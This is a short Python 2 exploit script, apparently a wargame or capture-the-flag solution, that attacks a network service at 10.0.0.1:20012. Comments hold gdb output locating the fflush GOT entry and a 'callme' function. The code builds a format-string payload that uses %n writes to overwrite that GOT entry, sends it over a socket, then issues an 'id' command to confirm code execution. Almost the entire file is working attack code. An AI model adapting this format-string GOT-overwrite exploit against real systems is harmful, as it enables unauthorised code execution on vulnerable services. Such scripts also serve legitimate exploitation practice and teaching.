#!/usr/bin/env python
import socket
import struct

TCP_IP = '10.0.0.1'
TCP_PORT = 20012
BUFFER_SIZE = 1024

#0804b528  00000607 R_386_JUMP_SLOT   00000000   fflush
#(gdb) x/wx 0x0804b528
#0x804b528 <fflush@got.plt>:	0x08048926
#(gdb) p callme
#$1 = {void (void)} 0x8049940 <callme>

byte4 = struct.pack("<I", 0x0804b528) #40
byte3 = struct.pack("<I", 0x0804b529) #99
byte2 = struct.pack("<I", 0x0804b52a) #804

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))
data = s.recv(BUFFER_SIZE)
bof = byte4 + "%99x%99x%38x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%nzz"+byte3+"%99x%99x%53x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%nzz"+byte2+"%99x%99x%99x%99x%99x%99x%99x%99x%99x%99x%99x%99x%99x%86x%08x%n\n"

s.send(bof)
while "Hmmm, " not in data:
	data = s.recv(BUFFER_SIZE)
s.send("id\n")
data = s.recv(BUFFER_SIZE)
print "received data:", data
s.close()

